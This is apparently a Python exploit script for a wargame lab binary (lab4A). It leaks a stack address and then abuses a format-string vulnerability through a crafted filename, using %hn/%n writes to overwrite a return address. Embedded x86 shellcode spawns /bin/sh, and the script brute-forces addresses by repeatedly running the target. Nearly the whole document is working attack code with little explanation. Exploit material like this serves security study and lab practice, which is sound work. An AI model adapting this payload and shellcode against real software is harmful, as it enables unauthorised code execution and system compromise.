# before running this exploit run the following commands: 
#
#  cd /tmp
#  mkdir workspace
#  cd workspace
#  mkdir backups
#  touch backups/.log
#

import os
import sys
import time
import struct

def exploit_buffer(shellcode_address):

  base_addr = 0xbffff001 # base address to brute force from
  fmt_str = "%{:s}x"     # format to dynamically calc write

  for i in range(base_addr, 0xc0000000):
    # I found this by comparing the ENV set vs unset
    # e.g (<leak> - <shellcode location>)
    # gef> unset env LINES
    # gef> unset env COLUMNS
    # When set RET = 0xbffff5ec, when unset RET = 0xbffff60c
    tmp = shellcode_address+14

    exploit_buff  = "A"
    exploit_buff += struct.pack('<L', base_addr  )
    exploit_buff += "CCCC"
    exploit_buff += struct.pack('<L', base_addr+2)
    exploit_buff += "EEEE"

    filename  = exploit_buff
    filename += ".%p" * 12

    mod_shell_addr = str(hex(tmp)) # modify the shellcode address

    no_x = mod_shell_addr.split('x')[1]
    if (no_x.endswith('L')):
      no_x = no_x[:-1]

    upper, lower = [no_x[i:i+4] for i in range(0, len(no_x), 4)]

    lower_calc = int(("0x%s" % lower), 0) - 0x0091 + 9
    highr_calc = 0x1bfff - (0x91 + lower_calc) + 8

    filename += fmt_str.format(str(lower_calc))  # 0xYYYY-0x0091+8
    filename += "%hn"                            # write 0x0000YYYY
    filename += fmt_str.format(str(highr_calc))  # 0x91+<spacing above> == <what upper will be>, we can then do: 0x1bfff-<upper>+8
    filename += "%n"

    filename += (
    "\x90"
    "\x90"
    "\x31\xC9"             # xor ecx,ecx
    "\xF7\xE1"             # mul ecx
    "\xBB\x24\x3A\xF8\xB7" # mov ebx,0xb7f83a24 -> "/bin/sh"
    "\xB0\x0B"             # mov al,0xb
    "\xCD\x80"             # int 0x80
    "\x90"
    "\x90"
    )
    sys.stdout.write("[+] trying 0x%0.8x, buffer size: %d, shellcode addr: 0x%0.8x\n" % (base_addr, len(filename), tmp))

    try:
      fd = open(filename, 'w')
      fd.write("wetw0rk")
      os.system("/levels/lab04/lab4A %s" % filename)
    except:
      pass

    os.system("rm -f A* backups/A*")
    base_addr += 1

  return

def leak_address():
  filename = "wetw0rk.0x%08x.0x%08x.0x%08x"
  cmd  = "touch %s &&"                % filename
  cmd += "/levels/lab04/lab4A %s &&"  % filename
  cmd += "cat backups/.log &&"
  cmd += "rm -f %s backups/%s"           % (filename, filename)
  r = os.popen(cmd).read()
  addr = r.split('.')[len(r.split('.'))-1].rstrip('\n')

  sys.stdout.write("[*] nice, got the leaked address at %s\n" % hex(int(addr, 0))[:-1])
  sys.stdout.write("[*] shellcode should be located at %s\n" % hex(int(addr, 0)+14)[:-1])

  return (int(addr, 0))

def main():
  r = leak_address()
  exploit_buffer(r)

main()
